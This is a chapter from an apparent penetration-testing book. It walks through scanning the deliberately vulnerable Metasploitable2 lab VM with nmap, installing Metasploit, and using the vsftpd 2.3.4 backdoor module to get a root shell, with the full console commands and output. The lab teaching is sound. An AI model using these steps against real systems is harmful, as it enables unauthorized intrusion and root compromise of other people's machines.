# Chapter 8 Exploitation

## Metasploit

The Metasploit Framework is the most popular exploitation tool there is. Basically, it is a collection of known exploits that can be unleashed on a target. These exploits are based on known vulnerabilities which you should have identified before.
Besides exploits the framework also includes a set of possible payloads and evasion modules. Now I am going to assume you have already tried to use Metasploit in the past, usually testing the infamous Windows exploit which is considered the 'Hello, world! equivalent'. In this guide we will be using Metasploitable2 virtual machine to practice against. I suggest you follow along. Before we use Metasploit we will briefly revisit NMAP to scan the target machine for vulnerabilities.

You can download it from 'https://docs.rapid7.com/metasploit/metasploitable-2/', after it is installed use as loginname and password 'msfadmin'. You will need to know te IP address of the box, use 'ifconfig'

First lets run some NMAP commands

``` 
$ sudo nmap -sV [IP_METASPLOITABLE_2]
$ sudo nmap -sV -p 21 [IP_METASPLOITABLE_2]
```
You will quickly find numerous open services on this computer, with the version number neatly mentioned. This ia a stilted example of course, but ever since virtuliation software become popular and usable it has been a godsend with example 'boxes'.

``` 
Nmap scan report for 192.168.233.131
Host is up (0.0031s latency).
Not shown: 977 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         vsftpd 2.3.4
22/tcp   open  ssh         OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
23/tcp   open  telnet      Linux telnetd
25/tcp   open  smtp        Postfix smtpd
53/tcp   open  domain      ISC BIND 9.4.2
80/tcp   open  http        Apache httpd 2.2.8 ((Ubuntu) DAV/2)
111/tcp  open  rpcbind     2 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
512/tcp  open  exec        netkit-rsh rexecd
513/tcp  open  login
514/tcp  open  tcpwrapped
1099/tcp open  java-rmi    GNU Classpath grmiregistry
1524/tcp open  bindshell   Metasploitable root shell
2049/tcp open  nfs         2-4 (RPC #100003)
2121/tcp open  ftp         ProFTPD 1.3.1
3306/tcp open  mysql       MySQL 5.0.51a-3ubuntu5
5432/tcp open  postgresql  PostgreSQL DB 8.3.0 - 8.3.7
5900/tcp open  vnc         VNC (protocol 3.3)
6000/tcp open  X11         (access denied)
6667/tcp open  irc         UnrealIRCd
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
8180/tcp open  http        Apache Tomcat/Coyote JSP engine 1.1
MAC Address: 00:0C:29:40:96:B4 (VMware)
Service Info: Hosts:  metasploitable.localdomain, irc.Metasploitable.LAN; OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.20 seconds
```

Now lets fire up Metasploit and check if anything listed above might be a vulnerability. There are other ways to check of course, you can dive online as well but lets try our luck with the tool we actually want to use.

If you are using Ubuntu then Metasploit is not installed by default, unlike Kali Linux. The steps below use the official installer script to install Metaploit on Ubuntu. I suggest this option, it will install all dependencies for you.

``` 
## Download the Metasploit installer
wget http://downloads.metasploit.com/data/releases/metasploit-latest-linux-x64-installer.run

## Make the installer executable
sudo chmod +x ./metasploit-latest-linux-x64-installer.run

## Install Metasploit
sudo ./metasploit-latest-linux-x64-installer.run
```

After the installation is complete just enter `msfconsole` to start the application. You should end up seeing a new console that includes some graphical courtesy of Rapid7. Commands can now be entered after 'msf6 >'. Lets start with a simple search for a vulnerability for vsftpd, the service we identified on port 21.

```
msf6 > search vsftdp
[-] No results from search
msf6 > search vsftpd

Matching Modules
================

   #  Name                                  Disclosure Date  Rank       Check  Description
   -  ----                                  ---------------  ----       -----  -----------
   0  exploit/unix/ftp/vsftpd_234_backdoor  2011-07-03       excellent  No     VSFTPD v2.3.4 Backdoor Command Execution


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/ftp/vsftpd_234_backdoor
```
Yes, there is one vulnerability, of course there would be with the Metasploitable 2 box, but this is the process you would normally use.

For now we will proceed with using this vulnerability to illustrate how to use Metasploit. If you want you can choose one of the other services identified with NMAP, normally there would not be the same amount to choose from but that is a problem for another time.

``` 
msf6 > use 
[*] No payload configured, defaulting to cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > 
```
So the exploit has been set, now we need a payload and select a target.
 
```
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show options

Module options (exploit/unix/ftp/vsftpd_234_backdoor):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT   21               yes       The target port (TCP)

Payload options (cmd/unix/interact):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------

Exploit target:

   Id  Name
   --  ----
   0   Automatic

View the full module info with the info, or info -d command.
```
This means it is mandatory to set the target IP (RHOSTS) and the target port (RPORT), that is pretty straightforward

``` 
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOST 192.168.233.131
```

``` 
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > show payloads

Compatible Payloads
===================

   #  Name                       Disclosure Date  Rank    Check  Description
   -  ----                       ---------------  ----    -----  -----------
   0  payload/cmd/unix/interact                   normal  No     Unix Command, Interact with Established Connection

msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set PAYLOAD 0
PAYLOAD => cmd/unix/interact
```
Now we are all set, we choosen the exploit based on a vulnerability. We set the target hosts IP address, but left out its port because the default is port 21 anyway. Finally, we set the payload which is a simple Unix shell. Now we can spring the exploitation and hack into the target computer. When it comes to classically hacking this would be the first time we have done so in this book.

``` 
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit

[*] 192.168.233.131:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 192.168.233.131:21 - USER: 331 Please specify the password.
[+] 192.168.233.131:21 - Backdoor service has been spawned, handling...
[+] 192.168.233.131:21 - UID: uid=0(root) gid=0(root)
[*] Found shell.
[*] Command shell session 1 opened (192.168.233.129:32781 -> 192.168.233.131:6200) at 2022-12-22 12:46:21 +0100

uname -a
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux

ifconfig
eth0      Link encap:Ethernet  HWaddr 00:0c:29:40:96:b4  
          inet addr:192.168.233.131  Bcast:192.168.233.255  Mask:255.255.255.0
          inet6 addr: fe80::20c:29ff:fe40:96b4/64 Scope:Link
          UP BROADCAST RUNNING MULTICAST  MTU:1500  Metric:1
          RX packets:1406 errors:0 dropped:0 overruns:0 frame:0
          TX packets:1388 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:1000 
          RX bytes:94271 (92.0 KB)  TX bytes:136273 (133.0 KB)
          Interrupt:17 Base address:0x2000 

lo        Link encap:Local Loopback  
          inet addr:127.0.0.1  Mask:255.0.0.0
          inet6 addr: ::1/128 Scope:Host
          UP LOOPBACK RUNNING  MTU:16436  Metric:1
          RX packets:432 errors:0 dropped:0 overruns:0 frame:0
          TX packets:432 errors:0 dropped:0 overruns:0 carrier:0
          collisions:0 txqueuelen:0 
          RX bytes:172681 (168.6 KB)  TX bytes:172681 (168.6 KB)

```
And we are in, run a few Linux commands to check you have hacked into Metasploitable 2!

